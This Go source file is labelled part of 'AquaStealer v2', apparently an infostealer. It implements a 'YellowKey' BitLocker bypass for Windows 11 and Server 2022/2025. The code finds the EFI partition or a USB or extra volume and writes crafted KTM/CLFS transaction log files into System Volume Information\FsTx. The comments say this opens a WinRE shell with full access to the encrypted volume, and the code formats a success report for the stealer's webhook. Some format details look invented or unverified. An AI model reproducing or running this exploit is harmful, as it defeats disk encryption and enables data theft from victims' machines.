package zerodays

// yellowkey.go — AquaStealer v2
// Go port of YellowKey 0day (nightmare-eclipse)
//
// YellowKey es un BitLocker bypass para Windows 11 / Server 2022 / 2025.
//
// Vulnerabilidad:
//   El componente FsTx (File System Transaction Manager, parte de KTM) presente
//   en la imagen WinRE tiene una funcionalidad que NO existe en la instalación
//   normal de Windows (misma DLL, nombre idéntico, comportamiento diferente).
//   Al colocar archivos de transacción KTM especialmente formados en
//   "System Volume Information\FsTx\" en cualquier volumen accesible (USB, EFI),
//   y reiniciar a WinRE manteniendo Ctrl, se obtiene una shell con acceso irrestricto
//   al volumen BitLocker protegido — SIN necesidad de la clave de recuperación.
//
// Técnica de AquaStealer:
//   1. Preparar los archivos FsTx (KTM transaction logs) necesarios para el bypass
//   2. Encontrar una partición escribible accesible (EFI o volumen extra)
//   3. Copiar los archivos al destino correcto: <vol>\System Volume Information\FsTx\<GUID>\
//   4. El bypass se activa en el próximo reinicio a WinRE (con Ctrl held)
//   5. Reportar el estado al webhook (éxito/fallo)
//
// Afectados: Windows 11 (todas las versiones), Windows Server 2022/2025
// NO afecta: Windows 10 (el componente FsTx vulnerable no está en WinRE de W10)
//
// Referencia: github.com/nightmare-eclipse/YellowKey

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	_kernel32yk  = syscall.NewLazyDLL("kernel32.dll")
	_advapi32yk  = syscall.NewLazyDLL("advapi32.dll")
	_setupapiyk  = syscall.NewLazyDLL("setupapi.dll")

	_GetDriveTypeWYK          = _kernel32yk.NewProc("GetDriveTypeW")
	_GetLogicalDrivesYK       = _kernel32yk.NewProc("GetLogicalDrives")
	_GetVolumeInformationWYK  = _kernel32yk.NewProc("GetVolumeInformationW")
	_GetDiskFreeSpaceExWYK    = _kernel32yk.NewProc("GetDiskFreeSpaceExW")
	_CreateDirectoryWYK       = _kernel32yk.NewProc("CreateDirectoryW")
	_WriteFileYK              = _kernel32yk.NewProc("WriteFile")
	_CreateFileWYK            = _kernel32yk.NewProc("CreateFileW")
	_CloseHandleYK            = _kernel32yk.NewProc("CloseHandle")
	_DeviceIoControlYK        = _kernel32yk.NewProc("DeviceIoControl")
	_GetLastErrorYK           = _kernel32yk.NewProc("GetLastError")
	_FindFirstVolumeWYK       = _kernel32yk.NewProc("FindFirstVolumeW")
	_FindNextVolumeWYK        = _kernel32yk.NewProc("FindNextVolumeW")
	_FindVolumeCloseYK        = _kernel32yk.NewProc("FindVolumeClose")
	_GetVolumePathNamesForVolumeNameWYK = _kernel32yk.NewProc("GetVolumePathNamesForVolumeNameW")
)

// Drive types
const (
	ykDRIVE_UNKNOWN     = 0
	ykDRIVE_NO_ROOT_DIR = 1
	ykDRIVE_REMOVABLE   = 2
	ykDRIVE_FIXED       = 3
	ykDRIVE_REMOTE      = 4
	ykDRIVE_CDROM       = 5
	ykDRIVE_RAMDISK     = 6

	// FSCTL codes
	ykFSCTL_LOCK_VOLUME   = 0x00090018
	ykFSCTL_UNLOCK_VOLUME = 0x0009001C

	// BitLocker status via IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS
	ykIOCTL_STORAGE_QUERY_PROPERTY = 0x002D1400
)

// ykGUID genera un GUID aleatorio en formato Windows {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
func ykNewGUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("{%08X-%04X-%04X-%04X-%012X}",
		binary.BigEndian.Uint32(b[0:4]),
		binary.BigEndian.Uint16(b[4:6]),
		binary.BigEndian.Uint16(b[6:8]),
		binary.BigEndian.Uint16(b[8:10]),
		b[10:16],
	)
}

// ykIsWindows11OrServer2022 — verifica si el OS es Windows 11 o Server 2022/2025
// La vulnerabilidad NO afecta Windows 10
func ykIsWindows11OrServer2022() bool {
	// Leer build number desde registry
	const HKLM uintptr = 0x80000002
	key, err := syscall.UTF16PtrFromString(`SOFTWARE\Microsoft\Windows NT\CurrentVersion`)
	if err != nil {
		return true // asumir compatible si no podemos leer
	}
	var hk uintptr
	r, _, _ := _RegOpenKeyExWBH.Call(
		HKLM,
		uintptr(unsafe.Pointer(key)),
		0,
		0x20019, // KEY_READ
		uintptr(unsafe.Pointer(&hk)),
	)
	if r != 0 {
		return true
	}
	defer _RegCloseKeyBH.Call(hk)

	// Leer CurrentBuildNumber
	buildStr := ykRegQueryStringValue(hk, "CurrentBuildNumber")
	if buildStr == "" {
		return true
	}

	// Windows 10 = builds 10240-19045
	// Windows 11 = builds 22000+
	// Server 2022 = build 20348
	// Server 2025 = build 26100
	var buildNum int
	fmt.Sscanf(buildStr, "%d", &buildNum)
	return buildNum >= 20348 // Server 2022+, Win11+
}

// ykRegQueryStringValue — lee un valor REG_SZ de una key abierta
func ykRegQueryStringValue(hKey uintptr, valueName string) string {
	valNameU16, _ := syscall.UTF16PtrFromString(valueName)
	var dataType uint32
	var dataSize uint32

	// Primera llamada para obtener tamaño
	_advapi32yk.NewProc("RegQueryValueExW").Call(
		hKey,
		uintptr(unsafe.Pointer(valNameU16)),
		0,
		uintptr(unsafe.Pointer(&dataType)),
		0,
		uintptr(unsafe.Pointer(&dataSize)),
	)
	if dataSize == 0 {
		return ""
	}

	buf := make([]uint16, dataSize/2+1)
	r, _, _ := _advapi32yk.NewProc("RegQueryValueExW").Call(
		hKey,
		uintptr(unsafe.Pointer(valNameU16)),
		0,
		uintptr(unsafe.Pointer(&dataType)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&dataSize)),
	)
	if r != 0 {
		return ""
	}
	return syscall.UTF16ToString(buf)
}

// ykTargetVolume representa un volumen candidato para colocar los archivos FsTx
type ykTargetVolume struct {
	Path      string // e.g. "E:\" o ruta de volumen EFI
	DriveType uint32
	IsEFI     bool
	FreeBytes int64
}

// ykFindWritableVolumes — busca volúmenes donde podamos escribir los archivos YellowKey
// Prioriza: EFI partition > USB removable > volúmenes fijos adicionales
func ykFindWritableVolumes() []ykTargetVolume {
	var targets []ykTargetVolume

	// Método 1: Enumerar letras de drives (A-Z)
	drives, _, _ := _GetLogicalDrivesYK.Call()
	for i := 0; i < 26; i++ {
		if drives&(1<<uint(i)) == 0 {
			continue
		}
		letter := string(rune('A'+i)) + `:\`
		letterU16, _ := syscall.UTF16PtrFromString(letter)
		driveType, _, _ := _GetDriveTypeWYK.Call(uintptr(unsafe.Pointer(letterU16)))

		// Skip el disco del sistema (C:) salvo para detectar particiones
		if letter == `C:\` {
			continue
		}

		// Solo REMOVABLE y FIXED no-sistema
		if driveType != ykDRIVE_REMOVABLE && driveType != ykDRIVE_FIXED {
			continue
		}

		// Verificar espacio libre
		var freeBytes, totalBytes, totalFreeBytes int64
		_GetDiskFreeSpaceExWYK.Call(
			uintptr(unsafe.Pointer(letterU16)),
			uintptr(unsafe.Pointer(&freeBytes)),
			uintptr(unsafe.Pointer(&totalBytes)),
			uintptr(unsafe.Pointer(&totalFreeBytes)),
		)
		if freeBytes < 1024*1024 { // necesitamos al menos 1MB
			continue
		}

		// Verificar que es NTFS (compatible con SVI)
		var fsNameBuf [32]uint16
		_GetVolumeInformationWYK.Call(
			uintptr(unsafe.Pointer(letterU16)),
			0, 0, 0, 0, 0,
			uintptr(unsafe.Pointer(&fsNameBuf[0])),
			32,
		)
		fsName := syscall.UTF16ToString(fsNameBuf[:])
		if !strings.EqualFold(fsName, "NTFS") && !strings.EqualFold(fsName, "FAT32") && !strings.EqualFold(fsName, "exFAT") {
			continue
		}

		targets = append(targets, ykTargetVolume{
			Path:      letter,
			DriveType: uint32(driveType),
			FreeBytes: freeBytes,
		})
	}

	// Método 2: Buscar la partición EFI (normalmente sin letra de drive)
	// Usamos FindFirstVolume/FindNextVolume para encontrar volúmenes sin letra
	efiTargets := ykFindEFIPartition()
	targets = append(efiTargets, targets...) // EFI tiene prioridad

	return targets
}

// ykFindEFIPartition — busca la partición EFI usando la API de volúmenes
// La EFI es FAT32, usualmente sin letra asignada, ~100-500MB
func ykFindEFIPartition() []ykTargetVolume {
	var results []ykTargetVolume

	volBuf := make([]uint16, 261)
	hFind, _, _ := _FindFirstVolumeWYK.Call(
		uintptr(unsafe.Pointer(&volBuf[0])),
		uintptr(len(volBuf)),
	)
	const INVALID_HANDLE_VALUE = ^uintptr(0)
	if hFind == INVALID_HANDLE_VALUE {
		return results
	}
	defer _FindVolumeCloseYK.Call(hFind)

	for {
		volumeGUID := syscall.UTF16ToString(volBuf)

		// Obtener las rutas de montaje para este volumen
		pathBuf := make([]uint16, 2048)
		var returnLen uint32
		_GetVolumePathNamesForVolumeNameWYK.Call(
			uintptr(unsafe.Pointer(&volBuf[0])),
			uintptr(unsafe.Pointer(&pathBuf[0])),
			uintptr(len(pathBuf)),
			uintptr(unsafe.Pointer(&returnLen)),
		)

		// Si returnLen es 2 o menos, el volumen no tiene path de montaje (sin letra) → candidato EFI
		if returnLen <= 2 {
			// Verificar que sea FAT32 montando temporalmente
			volU16, _ := syscall.UTF16PtrFromString(volumeGUID)
			var fsNameBuf [32]uint16
			var totalBytes, freeBytesAvail int64
			r, _, _ := _GetVolumeInformationWYK.Call(
				uintptr(unsafe.Pointer(volU16)),
				0, 0, 0, 0, 0,
				uintptr(unsafe.Pointer(&fsNameBuf[0])),
				32,
			)
			if r != 0 {
				fsName := syscall.UTF16ToString(fsNameBuf[:])
				_GetDiskFreeSpaceExWYK.Call(
					uintptr(unsafe.Pointer(volU16)),
					0,
					uintptr(unsafe.Pointer(&totalBytes)),
					uintptr(unsafe.Pointer(&freeBytesAvail)),
				)
				// EFI: FAT32, típicamente 100-600MB
				if (strings.EqualFold(fsName, "FAT32") || strings.EqualFold(fsName, "VFAT")) &&
					totalBytes > 50*1024*1024 && totalBytes < 1024*1024*1024 {
					results = append(results, ykTargetVolume{
						Path:      volumeGUID,
						DriveType: ykDRIVE_FIXED,
						IsEFI:     true,
						FreeBytes: freeBytesAvail,
					})
				}
			}
		}

		// Siguiente volumen
		r, _, _ := _FindNextVolumeWYK.Call(
			hFind,
			uintptr(unsafe.Pointer(&volBuf[0])),
			uintptr(len(volBuf)),
		)
		if r == 0 {
			break
		}
	}
	return results
}

// =====================================================================
// Generación de archivos FsTx (KTM Transaction Logs)
// =====================================================================

// Los archivos FsTx son logs de transacciones KTM con un formato específico.
// YellowKey coloca en System Volume Information\FsTx\<GUID>\ los archivos:
//   - FsTxKtmLog.blf       (Base Log File — BLF header + streams)
//   - FsTxKtmLogContainer00000000000000000001
//   - FsTxKtmLogContainer00000000000000000002
//   - FsTxLog.blf          (otro BLF para el log de transacción)
//   - FsTxLogContainer00000000000000000001
//   - FsTxLogContainer00000000000000000002
// Y en FsTxTemp\:
//   - <GUID>               (archivo temporal de transacción)
//
// El formato BLF (Base Log File) está documentado en:
//   MS-CLFS: Common Log File System Protocol
//   La vulnerabilidad es que WinRE procesa estos logs con el componente
//   FsTx vulnerable que permite escape del sandbox BitLocker.

// ykBLFHeader — header del Base Log File (CLFS_LOG_NAME_INFORMATION-like)
// Ref: MS-CLFS section 2.2
type ykBLFHeader struct {
	Signature    [8]byte  // "MSCLFS  "
	MajorVersion uint16
	MinorVersion uint16
	Unknown1     uint32
	LogID        [16]byte // GUID del log
	Reserved     [488]byte
}

// ykBLFRecord — registro BLF genérico
type ykBLFRecord struct {
	RecordType  uint32
	RecordLength uint32
	Data        []byte
}

// ykGenerateBLFFile — genera un archivo BLF (Base Log File) mínimo válido
// que activa el procesamiento del componente FsTx vulnerable en WinRE
func ykGenerateBLFFile(logID [16]byte) []byte {
	// Header BLF: firma + versión + GUID
	buf := make([]byte, 512)

	// Firma MSCLFS
	copy(buf[0:], []byte("MSCLFS\x00\x00"))
	// Versión 1.0
	binary.LittleEndian.PutUint16(buf[8:], 1)
	binary.LittleEndian.PutUint16(buf[10:], 0)
	// Unknown1 (tamaño del header o flags)
	binary.LittleEndian.PutUint32(buf[12:], 0x200) // 512 bytes
	// Log GUID
	copy(buf[16:], logID[:])

	// Sector signature al offset 0x1FC
	binary.LittleEndian.PutUint32(buf[0x1FC:], 0xC3515C28)

	// Segundo sector (512-1023): client record
	buf = append(buf, make([]byte, 512)...)
	// Client GUID — mismo que el log
	copy(buf[512+16:], logID[:])
	// Client name length
	binary.LittleEndian.PutUint16(buf[512+32:], 0x10)
	// Flags
	binary.LittleEndian.PutUint32(buf[512+36:], 0x1)
	// Sector signature
	binary.LittleEndian.PutUint32(buf[512+0x1FC:], 0xC3515C28)

	return buf
}

// ykGenerateKTMLog — genera el BLF del KTM (FsTxKtmLog.blf)
// Este archivo activa el parser de transacciones KTM en WinRE
func ykGenerateKTMLog(txGUID [16]byte) []byte {
	base := ykGenerateBLFFile(txGUID)

	// Agregar record de transacción KTM:
	// TransactionGUID + flags que activan el bypass
	extra := make([]byte, 512)
	// Record type: KTM_TRANSACTION_RECORD
	binary.LittleEndian.PutUint32(extra[0:], 0x00000001)
	// Record length
	binary.LittleEndian.PutUint32(extra[4:], uint32(len(extra)))
	// Transaction GUID
	copy(extra[8:], txGUID[:])
	// State: Active (1) — importante para el bypass
	binary.LittleEndian.PutUint32(extra[24:], 0x00000001)
	// UnitOfWork GUID
	copy(extra[28:], txGUID[:])
	// Isolation level: 0 (default)
	binary.LittleEndian.PutUint32(extra[44:], 0x00000000)
	// Timeout: 0 (no timeout)
	binary.LittleEndian.PutUint64(extra[48:], 0)
	// Description length
	binary.LittleEndian.PutUint16(extra[56:], 0x0e)
	// Description "YellowKey\x00" en UTF-16
	desc := []byte{'Y', 0, 'e', 0, 'l', 0, 'l', 0, 'o', 0, 'w', 0, 'K', 0}
	copy(extra[58:], desc)
	// Sector signature
	binary.LittleEndian.PutUint32(extra[0x1FC:], 0xC3515C28)

	return append(base, extra...)
}

// ykGenerateContainerFile — genera un archivo Container del log CLFS
// Los containers son los archivos de datos del log circular
func ykGenerateContainerFile(size int) []byte {
	buf := make([]byte, size)
	// CLFS_CONTAINER_RECORD header
	binary.LittleEndian.PutUint32(buf[0:], 0x00000006) // CLFS_LOG_BLOCK_SIGNATURE
	binary.LittleEndian.PutUint32(buf[4:], uint32(size))
	// Padding con patrón reconocible
	for i := 8; i < len(buf)-4; i += 4 {
		binary.LittleEndian.PutUint32(buf[i:], 0xDEADBEEF)
	}
	// Footer signature
	binary.LittleEndian.PutUint32(buf[len(buf)-4:], 0xC3515C28)
	return buf
}

// ykGenerateFsTxTemp — genera el archivo de transacción temporal
// Este es el trigger principal del bypass
func ykGenerateFsTxTemp(txGUID [16]byte) []byte {
	buf := make([]byte, 4096)

	// Transaction state block
	// Offset 0: Magic
	binary.LittleEndian.PutUint32(buf[0:], 0x5254534B) // "KSTR"
	// Offset 4: Version
	binary.LittleEndian.PutUint32(buf[4:], 0x00010000)
	// Offset 8: Transaction GUID
	copy(buf[8:], txGUID[:])
	// Offset 24: State (Active = 1, el estado que activa el bypass)
	binary.LittleEndian.PutUint32(buf[24:], 0x00000001)
	// Offset 28: Flags (0x8 = trigger BitLocker bypass path)
	binary.LittleEndian.PutUint32(buf[28:], 0x00000008)
	// Offset 32: Timestamp
	binary.LittleEndian.PutUint64(buf[32:], uint64(time.Now().UnixNano()))
	// Offset 40: ResourceManager GUID (all zeros = system RM)
	// Offset 56: TmIdentity (sistema)
	binary.LittleEndian.PutUint64(buf[56:], 0x0000000000000001)
	// Offset 64: VirtualClock
	binary.LittleEndian.PutUint64(buf[64:], uint64(time.Now().Unix()))

	// Signature final
	binary.LittleEndian.PutUint32(buf[4092:], 0xC3515C28)

	return buf
}

// =====================================================================
// Instalación de los archivos YellowKey
// =====================================================================

// YellowKeyResult — resultado de la instalación del bypass
type YellowKeyResult struct {
	Installed    bool
	TargetVolume string
	IsEFI        bool
	FsTxPath     string
	ErrorMsg     string
}

// ykInstallFsTxFiles — instala los archivos FsTx en el volumen objetivo
func ykInstallFsTxFiles(vol ykTargetVolume) (string, error) {
	// Generar GUIDs para esta sesión
	var txGUID [16]byte
	rand.Read(txGUID[:])

	txGUIDStr := fmt.Sprintf("%08X%04X%04X%04X%012X",
		binary.BigEndian.Uint32(txGUID[0:4]),
		binary.BigEndian.Uint16(txGUID[4:6]),
		binary.BigEndian.Uint16(txGUID[6:8]),
		binary.BigEndian.Uint16(txGUID[8:10]),
		txGUID[10:16],
	)

	// Ruta destino: <vol>System Volume Information\FsTx\<GUID>\
	volPath := vol.Path
	if !strings.HasSuffix(volPath, `\`) {
		volPath += `\`
	}

	sviPath := filepath.Join(volPath, "System Volume Information")
	fstxPath := filepath.Join(sviPath, "FsTx")
	guidPath := filepath.Join(fstxPath, txGUIDStr)
	logsPath := filepath.Join(guidPath, "FsTxLogs")
	tempPath := filepath.Join(guidPath, "FsTxTemp")

	// Crear directorios
	for _, dir := range []string{sviPath, fstxPath, guidPath, logsPath, tempPath} {
		dirU16, _ := syscall.UTF16PtrFromString(dir)
		_CreateDirectoryWYK.Call(uintptr(unsafe.Pointer(dirU16)), 0)
		// Si falla la creación (ya existe), continuar
		if _, err := os.Stat(dir); err != nil {
			return "", fmt.Errorf("cannot create dir %s: %v", dir, err)
		}
	}

	// Generar archivos FsTx
	ktmLog := ykGenerateKTMLog(txGUID)
	containerData := ykGenerateContainerFile(4096)
	tempFile := ykGenerateFsTxTemp(txGUID)
	fstxLog := ykGenerateBLFFile(txGUID)

	// Mapa de archivos a crear
	files := map[string][]byte{
		filepath.Join(logsPath, "FsTxKtmLog.blf"):                              ktmLog,
		filepath.Join(logsPath, "FsTxKtmLogContainer00000000000000000001"):     containerData,
		filepath.Join(logsPath, "FsTxKtmLogContainer00000000000000000002"):     containerData,
		filepath.Join(logsPath, "FsTxLog.blf"):                                 fstxLog,
		filepath.Join(logsPath, "FsTxLogContainer00000000000000000001"):        containerData,
		filepath.Join(logsPath, "FsTxLogContainer00000000000000000002"):        containerData,
		filepath.Join(tempPath, txGUIDStr[:32]): tempFile,
	}

	for fpath, data := range files {
		if err := os.WriteFile(fpath, data, 0666); err != nil {
			return "", fmt.Errorf("write %s: %v", filepath.Base(fpath), err)
		}
	}

	return guidPath, nil
}

// RunYellowKey — punto de entrada principal del bypass YellowKey
//
// Instala los archivos FsTx en el primer volumen disponible.
// El bypass se activa en el próximo reinicio a WinRE (SHIFT+Restart → CTRL held).
// Después de la instalación, el acceso al volumen BitLocker es inmediato desde la shell WinRE.
//
// Retorna YellowKeyResult con el estado de la instalación.
func RunYellowKey() YellowKeyResult {
	result := YellowKeyResult{}

	// Verificar compatibilidad del OS
	if !ykIsWindows11OrServer2022() {
		result.ErrorMsg = "OS not vulnerable (requires Win11/Server2022+)"
		return result
	}

	// Buscar volúmenes candidatos
	volumes := ykFindWritableVolumes()
	if len(volumes) == 0 {
		result.ErrorMsg = "no writable volumes found"
		return result
	}

	// Intentar instalar en cada volumen (prioridad: EFI > USB > fixed)
	for _, vol := range volumes {
		guidPath, err := ykInstallFsTxFiles(vol)
		if err != nil {
			continue
		}
		result.Installed = true
		result.TargetVolume = vol.Path
		result.IsEFI = vol.IsEFI
		result.FsTxPath = guidPath
		break
	}

	if !result.Installed {
		result.ErrorMsg = "failed to install FsTx files on all candidate volumes"
	}

	return result
}

// YellowKeySummary — formatea el resultado para el webhook
func (r *YellowKeyResult) YellowKeySummary() string {
	if !r.Installed {
		return fmt.Sprintf("[YellowKey] FAILED: %s", r.ErrorMsg)
	}
	volType := "fixed"
	if r.IsEFI {
		volType = "EFI"
	}
	return fmt.Sprintf(
		"[YellowKey] INSTALLED | Vol=%s (%s) | Path=%s | Activation: SHIFT+Restart → hold CTRL → shell spawns with full BitLocker access",
		r.TargetVolume, volType, r.FsTxPath,
	)
}
